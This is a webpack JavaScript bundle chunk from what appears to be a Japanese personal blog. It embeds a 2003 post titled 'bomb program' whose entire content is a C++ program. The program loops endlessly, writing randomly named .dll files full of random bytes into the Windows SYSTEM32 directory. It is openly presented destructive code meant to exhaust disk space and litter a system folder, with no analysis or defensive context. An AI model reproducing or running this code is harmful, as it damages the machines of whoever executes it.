webpackJsonp([19808139922815],{3606:function(n,e){n.exports={data:{markdownRemark:{html:'<h1>include <string></h1>\n<pre><code>#include &#x3C;fstream>\n\n#include &#x3C;cstdlib>\n\nvoid main( void ){\n\n using namespace std;\n\n string dir = "C:\\\\WINDOWS\\SYSTEM32\\";\n\n while( 1 ){\n\n  string name;\n\n  int rnd = rand();\n\n  for( int i = 0; i &#x3C; ( rnd >> 10 ); i++ ){\n\n   name.resize( name.size() + 1 );\n\n   name[ i ] = 0x61 + ( rand() >> 11 );\n\n  }\n\n  ofstream file( ( dir + name + ".dll" ).c_str() );\n\n  for( int j = 0; j &#x3C; rnd; j++ ) file &#x3C;&#x3C; ( char )rand();\nfile.close();\n\n }\n\n}\n</code></pre>',frontmatter:{cover:null,date:"2003-12-12T11:00:00+09:00",strDate:"2003/12/12",title:"爆弾プログラム"}}},pathContext:{path:"/ja/blog/2003/12/12-爆弾プログラム/",langKey:"ja"}}}});
//# sourceMappingURL=path---ja-blog-2003-12-12-爆弾プログラム-8fd4f344bcaacf057ea9.js.map